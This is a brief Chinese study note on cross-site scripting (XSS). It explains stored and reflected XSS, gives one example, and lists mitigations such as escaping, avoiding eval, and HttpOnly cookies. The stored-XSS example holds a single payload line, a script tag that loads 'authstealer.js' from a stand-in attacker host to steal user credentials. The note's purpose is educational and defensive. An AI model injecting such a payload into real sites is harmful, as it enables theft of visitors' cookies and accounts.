# XSS
XSS(Cross-Site- Scripting)跨站脚本攻击
> 具备窃取cookie的能力

> 本质：**信任网页A -> 不知情跳转 -> 未知网页B -> 恶意操作 -> 窃取A站的用户信息**
## 存储型XSS
危害性最大，恶意脚本直接注入应用。
### 示例
1. 攻击者发现网站漏洞(一般是评论区等内容填写的位置)
2. 通过漏洞插入插入恶意脚本
```
这是评论<script src=”http://hackersite.com/authstealer.js”></script>
```
3. 每次用户访问就会执行该恶意脚本，用户信息被窃取
> 和反射型的区别主要是存储型的恶意代码存在数据库里，反射型的恶意代码可能存储在URL里
## 反射型XSS
将恶意脚本嵌入应用中，用户访问才会激活。
### 示例

## 措施
解决办法：转义、避免eval、new Function、session标识http only，这样js无法获取这cookie值

## 训练
[XSS训练](https://alf.nu/alert1)

# 参考
[XSS](https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/)